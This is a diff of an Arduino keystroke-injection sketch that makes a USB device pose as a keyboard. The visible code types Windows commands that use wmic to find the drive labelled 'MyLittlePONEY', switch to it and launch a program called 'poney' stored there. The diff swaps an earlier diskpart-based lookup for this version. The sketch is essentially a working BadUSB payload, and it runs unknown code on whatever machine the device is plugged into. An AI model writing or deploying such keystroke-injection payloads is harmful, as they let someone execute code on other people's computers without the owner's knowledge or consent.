@@ -1,12 +1,6 @@
 #include <Keyboard.h>
 
 void setup() {
-	
-	/*
-	for /f "tokens=3 delims= " %A in ('echo list volume ^| diskpart ^| findstr "DUCKY"') do (
-	set DUCKYdrive=%A
-	)
-	*/
 
 	Keyboard.begin();
 	delay(1000);
@@ -22,28 +16,35 @@ void setup() {
 	Keyboard.press(KEY_RETURN);
 	Keyboard.releaseAll();
 	delay(200);
+	
+	/*
+	for /f %%D in ('wmic volume get DriveLetter^, Label ^| find "yourLabel"') do set usb=%%D
+	*/
 
-	Keyboard.print("for /f \"tokens=3 delims= \" %A in ('echo list volume ^");
-	//Keyboard.print("|"); 
-	Keyboard.press(KEY_RIGHT_ALT);
-	Keyboard.print("-");
-	Keyboard.releaseAll();
-	Keyboard.print(" diskpart ^");
+	Keyboard.print("for /f %D in ('wmic volume get DriveLetter^, Label ^");
 	//Keyboard.print("|");
 	Keyboard.press(KEY_RIGHT_ALT);
 	Keyboard.print("-");
 	Keyboard.releaseAll();
-	Keyboard.print(" findstr  \"MyLittlePONEY\"') do (");
+	Keyboard.print("find \"MyLittlePONEY\"') do set PONEY=%D");
+	delay(200);
+	
 	Keyboard.press(KEY_RETURN);
 	Keyboard.releaseAll();
+	delay(200);
 
-	Keyboard.print("set PONEY=%A");
+	Keyboard.print("%PONEY%");
 	Keyboard.press(KEY_RETURN);
 	Keyboard.releaseAll();
+	delay(50);
 
-	Keyboard.print(")");
+	Keyboard.print("poney");
 	Keyboard.press(KEY_RETURN);
 	Keyboard.releaseAll();
+	delay(50);
+
+	Keyboard.end();
+
 }
 
 
